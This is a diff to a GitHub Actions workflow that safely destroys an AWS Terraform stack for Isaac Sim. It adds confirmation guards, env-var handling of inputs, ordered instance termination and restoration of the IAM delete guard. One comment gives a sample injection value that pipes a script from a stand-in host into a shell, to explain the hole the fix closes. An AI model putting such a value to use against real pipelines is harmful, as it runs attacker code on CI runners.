@@ -113,16 +113,28 @@ jobs:
     if: github.event_name == 'workflow_dispatch' && github.event.inputs.action == 'destroy'
     runs-on: ubuntu-latest
     steps:
-      # Guard 1: a typo in the dropdown should not delete the stack. The
+      # Checkout comes first. Every `run:` step inherits working-directory:
+      # infra from the defaults above, and that folder does not exist until
+      # the repo is on disk - a run step placed above this one dies before
+      # its first line executes.
+      - uses: actions/checkout@v4
+
+      # Guard 1: a mis-click in the dropdown should not delete the stack. The
       # operator has to type the phrase out before anything touches AWS.
+      #
+      # The phrase arrives through the environment and is never spliced into
+      # the script with ${{ }}. Spliced in, a value like
+      # "$(curl -s http://x/p.sh | sh)destroy isaac-sim" would run on the
+      # runner AND still compare equal - the guard would wave through the
+      # very input it exists to check.
       - name: Check the confirmation phrase
+        env:
+          CONFIRM: ${{ github.event.inputs.confirm }}
         run: |
-          if [ "${{ github.event.inputs.confirm }}" != "destroy isaac-sim" ]; then
+          if [ "$CONFIRM" != "destroy isaac-sim" ]; then
             echo "::error::Confirmation phrase missing or wrong. Re-run with confirm = 'destroy isaac-sim'."
             exit 1
           fi
-
-      - uses: actions/checkout@v4
 
       - uses: aws-actions/configure-aws-credentials@v4
         with:
@@ -135,14 +147,22 @@ jobs:
 
       # Guard 2: the instance is launched by hand from the template, so it is
       # NOT in Terraform state and `terraform destroy` will not touch it. Left
-      # behind it becomes an orphan that still bills. Abort unless the operator
-      # asked for it to go too.
-      - name: Handle the untracked Isaac Sim instance
+      # behind it bills forever, and its network card pins the security group
+      # so the destroy would fail on that anyway.
+      #
+      # This step only LOOKS. Stopping here costs nothing, because nothing has
+      # been changed yet.
+      - name: Look for the untracked Isaac Sim instance
+        id: instance
+        env:
+          TERMINATE: ${{ github.event.inputs.terminate_instance }}
         run: |
           ids=$(aws ec2 describe-instances \
             --filters "Name=tag:Purpose,Values=isaac-sim" \
                       "Name=instance-state-name,Values=pending,running,stopping,stopped" \
             --query "Reservations[].Instances[].InstanceId" --output text)
+
+          echo "ids=$ids" >> "$GITHUB_OUTPUT"
 
           if [ -z "$ids" ]; then
             echo "No Purpose=isaac-sim instance is alive. Nothing to terminate."
@@ -151,16 +171,11 @@ jobs:
 
           echo "Found untracked Isaac Sim instance(s): $ids"
 
-          if [ "${{ github.event.inputs.terminate_instance }}" != "true" ]; then
+          if [ "$TERMINATE" != "true" ]; then
             echo "::error::Instance(s) $ids are still alive and terraform destroy will not remove them."
             echo "::error::Push any work off the disk first, then re-run with terminate_instance = true."
             exit 1
           fi
-
-          echo "Terminating $ids (its disk is delete-on-termination and goes with it)."
-          aws ec2 terminate-instances --instance-ids $ids
-          aws ec2 wait instance-terminated --instance-ids $ids
-          echo "Terminated."
 
       - name: Init
         run: terraform init
@@ -168,19 +183,74 @@ jobs:
       # aws_iam_user.force_destroy is read from STATE at delete time, not from
       # the config, so passing the variable to `destroy` alone does nothing.
       # This targeted apply writes the new value into state first.
+      #
+      # -refresh=false is deliberate. On a re-run after a part-way destroy,
+      # some users may already be gone from AWS; a refresh would notice and
+      # plan to CREATE them again, just so the next step could delete them.
       - name: Allow the developer users to be deleted
         if: github.event.inputs.force_destroy_users == 'true'
         run: |
-          terraform apply -auto-approve \
+          if ! terraform state list aws_iam_user.developers | grep -q .; then
+            echo "No developer users left in state. Nothing to flag."
+            exit 0
+          fi
+
+          terraform apply -auto-approve -refresh=false \
             -var="force_destroy_users=true" \
             -target=aws_iam_user.developers
 
       # Printed in full so the run log is the record of what was removed.
       - name: Plan the destroy
+        env:
+          FORCE_DESTROY_USERS: ${{ github.event.inputs.force_destroy_users }}
         run: |
           terraform plan -destroy \
-            -var="force_destroy_users=${{ github.event.inputs.force_destroy_users }}" \
+            -var="force_destroy_users=$FORCE_DESTROY_USERS" \
             -out=tfdestroy
+
+      # Only now, with a working plan in hand, is anything irreversible done.
+      # The instance is not part of that plan, so terminating it earlier bought
+      # nothing and risked everything: a state lock held by another run, or an
+      # AMI that no longer resolves, would have failed the job with the disk
+      # already gone and the stack still standing.
+      - name: Terminate the untracked instance
+        if: steps.instance.outputs.ids != ''
+        env:
+          IDS: ${{ steps.instance.outputs.ids }}
+        run: |
+          echo "Terminating $IDS (its disk is delete-on-termination and goes with it)."
+          aws ec2 terminate-instances --instance-ids $IDS
+
+          # The security group cannot be deleted while the instance's network
+          # card still exists, so this has to finish before the destroy runs.
+          # One `wait` gives up after 10 minutes, which a large GPU instance
+          # can exceed, so allow three rounds before calling it stuck.
+          for round in 1 2 3; do
+            if aws ec2 wait instance-terminated --instance-ids $IDS; then
+              echo "Terminated."
+              exit 0
+            fi
+            echo "Still terminating after round $round..."
+          done
+
+          echo "::error::Instance(s) $IDS did not reach 'terminated' within 30 minutes."
+          exit 1
 
       - name: Destroy
         run: terraform apply tfdestroy
+
+      # If the run failed after the flag was written, it would sit in state as
+      # `true` - nothing ever refreshes it back from the API - and the next
+      # plain `terraform destroy` from anyone's laptop would wipe the
+      # developers' credentials with no DeleteConflict to stop it. Put it back.
+      - name: Re-arm the delete guard on the users
+        if: failure() && github.event.inputs.force_destroy_users == 'true'
+        run: |
+          if ! terraform state list aws_iam_user.developers | grep -q .; then
+            echo "The developer users are already gone from state. Nothing to re-arm."
+            exit 0
+          fi
+
+          terraform apply -auto-approve -refresh=false \
+            -var="force_destroy_users=false" \
+            -target=aws_iam_user.developers
